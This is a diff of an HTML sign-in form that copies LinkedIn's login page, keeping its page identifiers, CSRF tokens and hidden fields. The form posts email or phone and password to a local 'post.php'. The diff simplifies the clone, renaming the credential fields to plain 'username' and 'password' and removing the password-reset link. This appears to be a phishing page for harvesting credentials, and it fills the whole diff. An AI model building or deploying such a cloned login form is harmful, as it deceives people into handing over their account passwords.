@@ -130,77 +130,45 @@
   
 <!---->            
     <form method="post" class="login__form" action="post.php" novalidate>
-        
+    <!-- CSRF token and hidden fields -->
     <input name="csrfToken" value="ajax:4857712655652430627" type="hidden">  
- <code id="login_form_validation_error_username" style="display: none"><!--"Please enter a valid username."--></code>
-    <code id="consumer_login__text_plain__large_username" style="display: none"><!--"Email or phone number must be between 3 to 128 characters."--></code>
-      <code id="consumer_login__text_plain__no_username" style="display: none"><!--"Please enter an email address or phone number."--></code>
+    <input name="ac" value="0" type="hidden">
+    <input name="loginFailureCount" value="0" type="hidden">
+    <input name="sIdString" value="346ac37a-d2d3-4f10-b9bb-23d1c276844c" type="hidden">
+    <input name="pkSupported" value="false" type="hidden">
+    <input name="parentPageKey" value="d_checkpoint_lg_consumerLogin" type="hidden">
+    <input name="pageInstance" value="urn:li:page:checkpoint_lg_login_default;qtvE3CnXSeWysNG6AF0EoA==" type="hidden">
+    <input name="trk" type="hidden">
+    <input name="authUUID" type="hidden">
+    <input name="session_redirect" type="hidden">
+    <input name="loginCsrfParam" value="9fba6d56-7431-47b7-86a7-46ec93fecf07" type="hidden">
+    <input name="fp_data" value="default" id="fp_data_login" type="hidden">
+    <input name="apfc" value="{}" id="apfc-login" type="hidden">
+    <input name="_d" value="d" type="hidden">
 
+    <!-- Username field -->
     <div class="form__input--floating mt-24">
-<!---->      <input id="username" name="session_key" aria-describedby="error-for-username" required validation="email|tel" value autofocus autocomplete="username" aria-label="Email or phone" type="text">
-        <label class="form__label--floating" for="username" aria-hidden="true">
-          Email or phone
-        </label>
-      <div error-for="username" id="error-for-username" class="form__label--error  hidden" role="alert" aria-live="assertive">
-<!---->      </div>
+        <input id="username" name="username" aria-describedby="error-for-username" required value="" autofocus autocomplete="username" aria-label="Email or phone" type="text">
+        <label class="form__label--floating" for="username" aria-hidden="true">Email or phone</label>
+        <div error-for="username" id="error-for-username" class="form__label--error hidden" role="alert" aria-live="assertive"></div>
     </div>
-    <code id="domainSuggestion" style="display: none"><!--false--></code>
 
-    <div class="google-sign-in-promo"></div>
-  
-        <input name="ac" value="0" type="hidden">
-        <input name="loginFailureCount" value="0" type="hidden">
-      <input name="sIdString" value="346ac37a-d2d3-4f10-b9bb-23d1c276844c" type="hidden">
-      
-      <input id="pkSupported" name="pkSupported" value="false" type="hidden">
-
-      <input name="parentPageKey" value="d_checkpoint_lg_consumerLogin" type="hidden">
-      <input name="pageInstance" value="urn:li:page:checkpoint_lg_login_default;qtvE3CnXSeWysNG6AF0EoA==" type="hidden">
-      <input name="trk" type="hidden">
-      <input name="authUUID" type="hidden">
-      <input name="session_redirect" type="hidden">
-      <input name="loginCsrfParam" value="9fba6d56-7431-47b7-86a7-46ec93fecf07" type="hidden">
-      <input name="fp_data" value="default" id="fp_data_login" type="hidden">
-      <input name="apfc" value="{}" id="apfc-login" type="hidden">
-
-      <input name="_d" value="d" type="hidden">
-<!----><!---->        <input name="showGoogleOneTapLogin" value="true" type="hidden">
-        <input name="showAppleLogin" value="true" type="hidden">
-        <input name="showMicrosoftLogin" value="true" type="hidden">
-        <code id="i18nShow" style="display: none"><!--"Show"--></code>
-        <code id="i18nHide" style="display: none"><!--"Hide"--></code>
-          <input name="controlId" value="d_checkpoint_lg_consumerLogin-login_submit_button" type="hidden">
-           <code id="consumer_login__text_plain__empty_password" style="display: none"><!--"Please enter a password."--></code>
-    <code id="consumer_login__text_plain__small_password" style="display: none"><!--"The password you provided must have at least 6 characters."--></code>
-    <code id="consumer_login__text_plain__large_password" style="display: none"><!--"The password you provided must have at most 400 characters."--></code>
-    <code id="consumer_login__text_plain__wrong_password" style="display: none"><!--"Hmm, that’s not the right password. Please try again"--></code>
-    <code id="consumer_login__text_plain__large_password_200_chars" style="display: none"><!--"The password you provided must have at most 200 characters."--></code>
-
+    <!-- Password field -->
     <div class="form__input--floating mt-24">
-<!---->      <input id="password" aria-describedby="error-for-password" name="session_password" required validation="password" autocomplete="current-password" aria-label="Password" type="password">
-        <label for="password" class="form__label--floating" aria-hidden="true">
-            Password
-        </label>
-      <span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0">
-        Show
-      </span>
-      <div error-for="password" id="error-for-password" class="form__label--error  hidden" role="alert" aria-live="assertive">
-<!---->      </div>
+        <input id="password" name="password" aria-describedby="error-for-password" required validation="password" autocomplete="current-password" aria-label="Password" type="password">
+        <label for="password" class="form__label--floating" aria-hidden="true">Password</label>
+        <span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0">Show</span>
+        <div error-for="password" id="error-for-password" class="form__label--error hidden" role="alert" aria-live="assertive"></div>
     </div>
-  
-          <a href="/checkpoint/rp/request-password-reset" class="btn__tertiary--medium forgot-password" data-cie-control-urn="forgot-password-btn">
-            Forgot password?
-          </a>
 
-<!---->
-<!---->
-        <div class="login__form_action_container ">
-<!---->          <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" aria-label="Sign in" type="submit">
-              Sign in
-          </button>
-        </div>
-      
-    </form> 
+    <!-- Submit button -->
+    <div class="login__form_action_container">
+        <button class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit" aria-label="Sign in" type="submit">
+            Sign in
+        </button>
+    </div>
+</form>
+
               <div class="alternate-signin-container">
         
     <div id="or-separator" class="or-separator mt-12 snapple-seperator hidden">
